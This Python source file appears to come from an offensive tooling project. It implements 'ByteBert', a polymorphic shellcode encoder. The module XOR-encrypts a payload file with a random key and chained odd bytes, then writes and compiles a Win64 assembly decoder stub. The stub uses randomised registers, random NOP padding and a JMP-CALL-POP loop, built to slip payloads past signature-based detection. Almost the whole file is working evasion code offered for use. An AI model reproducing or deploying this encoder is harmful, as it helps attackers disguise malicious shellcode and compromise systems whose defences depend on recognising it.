### DEFINITIONS
# reg1 = save / read encryptedbyte(odd)
# reg2 = shellcode indexer
# reg3 = counter
# reg1, reg2 = random.sample(registers, 2)
#
# Compiled Code cut from offset 100 tp 156+len(shellcode)
# insert shellcode into vs template
# or inject via shencode
# autocompile?

#import utils.arg
import modules.extract
import random
from utils.helper import nstate as nstate
from os import path as osp
from subprocess import run

CATEGORY = 'encoder'

def register_arguments(parser):
            parser.add_argument('-i', '--input', help='Input file to use with byteswap stub')
            parser.add_argument('-o', '--output', help='outputfile for byteswap stub')
            parser.add_argument('-v', '--variable-padding', action='store_true', help='Inserts a random NOP to differ the padding')

class bb_encoder:
    Author = 'psycore8'
    Description = 'ByteBert - Advanced polymorphic Encoder Stub'
    Version = '0.1.3'
    Shellcode = ''
    Shellcode_Bin = b''
    Shellcode_Length = ''
    Modified_Shellcode = ''
    OutputFile_Root = ''
    key = 0
    start_offset = '100'
    end_offset = ''

    def __init__(self, input_file, output_file, random_padding=bool):
        self.input_file = input_file
        self.output_file = output_file
        self.random_padding = random_padding

    # def init():
    #     spName = 'bytebert'
    #     spArgList = [
    #         ['-i', '--input', '', '', 'Input file to use with byteswap stub'],
    #         ['-o', '--output', '', '', 'outputfile for byteswap stub'],
    #         ['-v', '--variable-padding', '', 'store_true', 'Inserts a random NOP to differ the padding']
    #     ]
    #     utils.arg.CreateSubParser(spName, xor.Description, spArgList)

    def encrypt(self, data: bytes, xor_key: int) -> bytes:
        transformed = bytearray()
        prev_enc_byte = 0
        for i, byte in enumerate(data):
            if i % 2 == 0: # even byte positions
                enc_byte = byte ^ xor_key
            else:          # odd byte positions
                enc_byte = byte ^ prev_enc_byte
            
            transformed.append(enc_byte)
            prev_enc_byte = enc_byte

        return bytes(transformed)

    def LoadHeader(self):
        self.Modified_Shellcode = self.generate_win64_stub()
        size = len(self.Modified_Shellcode)
        print(f'{nstate.OKBLUE} Stub generated with a size of {size} bytes')

    def LoadShellcode(self):
        self.key = random.randint(1, 255)
        print(f'{nstate.OKGREEN} Random key: {self.key} ({hex(self.key)})')
        try:
          with open(self.input_file, 'rb') as file:
             shellcode_bytes = file.read()
        except FileNotFoundError:
          print(f'{nstate.FAIL} File {self.input_file} not found or cannot be opened.')
          exit()
        self.Shellcode_Bin = self.encrypt(shellcode_bytes, self.key)
        size = len(self.Shellcode_Bin)
        self.Shellcode_Length = str(size)
        self.end_offset = str( 404 )
        print(f'{nstate.OKGREEN} Payload size: {self.Shellcode_Length}')

    def ConvertShellCodeToStr(self):
        self.Shellcode = [f"0x{byte:02X}" for byte in self.Shellcode_Bin]
        self.Shellcode = '      Shellcode: db '+','.join(self.Shellcode)

    def AppendShellcode(self):
        self.Modified_Shellcode += self.Shellcode
        size = len(self.Modified_Shellcode)
        print(f'{nstate.OKBLUE} XORed payload added, size of shellcode {size} bytes')

    def replace_bytes_at_offset(self, data, offset, new_bytes):
        data = bytearray(data)
        data[offset] = int(new_bytes.encode('utf-8'))
        data.append(int(new_bytes))
        return bytes(data)

    def WriteToFile(self, data, filename):
      if isinstance(data, bytes):
        with open(filename, 'wb') as file:
            file.write(data)
      elif isinstance(data, str):
            with open(filename, 'w') as file:
                file.write(data)
      cf = osp.isfile(filename)
      if cf == True:
        print(f"{nstate.OKGREEN} XOR encoded shellcode created in {self.output_file}")
      else:
        print(f"{nstate.FAIL} XOR encoded Shellcode error, aborting script execution")
        exit()

    def CompileObjectFile(self):
        self.OutputFile_Root, output_file_extension = osp.splitext(self.output_file)
        run(f'nasm.exe -f win64 {self.output_file} -o {self.OutputFile_Root}.o')

    def ExtractShellCode(self):
        extract_shellcode = modules.extract.extract_shellcode(f'{self.OutputFile_Root}.o', f'{self.OutputFile_Root}.bs', self.start_offset, self.end_offset)
        extract_shellcode.process()
        
    def process(self):
       self.LoadShellcode()
       self.LoadHeader()
       self.ConvertShellCodeToStr()
       self.AppendShellcode()
       self.WriteToFile(self.Modified_Shellcode, self.output_file)
       self.CompileObjectFile()
       #self.ExtractShellCode()

    def generate_win64_stub(self):
        multi_bit_registers = [
           ['rax', 'eax', 'ax', 'al'],
           ['rbx', 'ebx', 'bx', 'bl'],
           ['rcx', 'ecx', 'cx', 'cl'],
           ['r9', 'r9d', 'r9w', 'r9b'],
           ['r10', 'r10d', 'r10w', 'r10b']
        ]


        reg1, reg2, reg3 = random.sample(multi_bit_registers, 3)
        # negotiated_key = ~self.key
        # print(negotiated_key)

        if int(self.Shellcode_Length) <= 256:
           sc_size = f'mov {reg3[3]}, {self.Shellcode_Length}'
        elif int(self.Shellcode_Length) > 256:
           sc_size = f'mov {reg3[2]}, {self.Shellcode_Length}'

        stub64 = f"""
                    section .data

                    section .text
                        global _start

                    _start:
                        xor {reg1[0]}, {reg1[0]}
                        xor {reg2[0]}, {reg2[0]}
                        xor {reg3[0]}, {reg3[0]}
                        {sc_size}              ; length of embedded shellcode
                        jmp short call_decoder   ; JMP-CALL-POP: 1. JMP

                    decoder:
                        pop rsi                  ; JMP-CALL-POP: 3. POP

                    decode_loop:
                        test {reg3[0]}, {reg3[0]}            ; are we ready?
                        jz Shellcode             ; jump, if finished

                        ; even byte (Index % 2 == 0)
                        mov {reg2[0]}, rsi
                        sub {reg2[3]}, Shellcode        ; calculate Index (rsi - Shellcode)
                        test {reg2[3]}, 1               ; check: Index & 1 (odd or even?)
                        jnz odd_byte             ; jump, if odd

                        ; processing for even bytes
                        mov {reg1[3]}, [rsi]			 ; save actual encrypted byte for the next loop
                        xor byte [rsi], {self.key}     ; decrypt byte in shellcode: byte sub negate(key)
                        jmp post_processing

                    odd_byte:
                        ; processing for odd bytes
                        ; not {reg1[3]}
                        xor byte [rsi], {reg1[3]}        ; decrypt: encoded_byte sub negate(previous_encoded_byte)

                    post_processing:
                        inc rsi                  ; next encrypted byte
                        dec {reg3[0]}                  ; decrease length
                        jmp decode_loop          ; back to the loop

                    call_decoder:
                        call decoder             ; JMP-CALL-POP: 2. CALL
                  """
        if self.random_padding:
            paddy = stub64.split('\n')
            noppy = '                        nop'
            random_noppy_index = random.randint(6, len(paddy)-2)
            paddy.insert(random_noppy_index, noppy)
            stub64_paddy = '\n'.join(paddy)
            return stub64_paddy
        else:
            return stub64